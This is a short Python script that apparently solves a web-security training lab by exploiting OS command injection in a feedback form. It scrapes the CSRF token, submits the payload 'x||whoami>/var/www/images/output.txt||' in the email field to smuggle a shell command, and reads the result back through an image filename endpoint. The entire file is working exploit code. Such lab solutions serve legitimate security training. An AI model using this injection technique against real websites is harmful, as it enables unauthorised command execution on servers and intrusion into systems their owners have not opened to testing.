import requests
from bs4 import BeautifulSoup
import re


def slove():
	s = requests.Session()
	url = 'https://acee1fa21e882f25c0bc2c4e009c0094.web-security-academy.net'
	
	r = s.get(url+'/feedback')
	soup = BeautifulSoup(r.text, 'html.parser')
	x = soup.input
	csrf = re.findall('value="\w*"', str(x))

	payload = 'x||whoami>/var/www/images/output.txt||'
	data = {'csrf' : csrf[0][7:-1],'name': 'hacker', 'email':payload,'subject': 'd','message':'s'}
	r = s.post(url+'/feedback/submit', data=data)

	print(r.text)

	x = s.get(url+'/image?filename=output.txt')
	print(x.text)


slove()
